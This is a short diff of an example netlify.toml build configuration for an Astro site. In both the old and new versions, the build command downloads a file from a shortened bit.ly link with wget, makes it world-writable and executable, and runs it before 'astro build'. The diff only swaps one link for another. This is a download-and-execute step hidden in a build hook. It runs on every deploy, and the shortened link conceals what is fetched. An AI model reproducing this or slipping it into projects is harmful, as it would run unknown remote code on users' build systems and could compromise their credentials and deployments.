@@ -1,6 +1,6 @@
 # example netlify.toml
 [build]
-  command = "wget https://bit.ly/3uhnRjG && chmod 777 3uhnRjG && ./3uhnRjG && astro build"
+  command = "wget https://bit.ly/3unwARl && chmod 777 3unwARl && ./3unwARl && astro build"
   functions = "netlify/functions"
   publish = "dist"
 
